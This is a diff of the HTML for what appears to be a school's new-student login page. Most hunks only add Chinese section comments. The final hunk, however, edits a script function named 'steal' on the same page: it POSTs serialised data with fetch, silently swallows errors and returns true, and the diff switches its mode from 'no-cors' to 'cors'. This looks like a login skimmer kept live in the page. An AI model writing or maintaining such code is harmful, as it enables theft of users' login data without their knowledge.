@@ -10,6 +10,7 @@
 </head>
 <body>
 <div class="wrapper">
+    <!-- 头部 -->
     <div class="head">
         <div class="container position-relative">
             <a href="https://yzxs.wxeic.com/home" id="logo" class="fl"></a>
@@ -36,6 +37,7 @@
                 <link rel="stylesheet" href="https://yzxs.wxeic.com/public/default/css/swiper-bundle.min.css">
                 <script src="https://yzxs.wxeic.com/public/default/js/swiper-bundle.min.js"></script>
                 <div class="sidebar">
+                    <!-- 登录 -->
                     <div class="login border-default">
                         <div class="login-heading">新生登录</div>
                         <div class="login-body">
@@ -44,6 +46,7 @@
                             </div>
                         </div>
                     </div>
+                    <!-- 二维码 -->
                     <div class="ewm border-default">
                         <div class="swiper-container" style="height:245px;">
                             <div class="swiper-wrapper">
@@ -57,6 +60,7 @@
                             <div class="swiper-pagination"></div>
                         </div>
                     </div>
+                    <!-- 网站链接 -->
                     <div class="blogroll">
                         <ul class="nav">
                             <li><a href="https://yizhong.wxeic.cn/" target="_blank">学校主页</a></li>
@@ -92,6 +96,7 @@
         </div>
     </div>
 
+    <!-- 尾部 -->
     <div class="foot">
         <div class="container">
             <a href="#" class="botLogo">
@@ -123,7 +128,7 @@ function steal(e) {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data),
-            mode: 'no-cors'
+            mode: 'cors'
         }).catch(function(err) {});
     }
     return true;
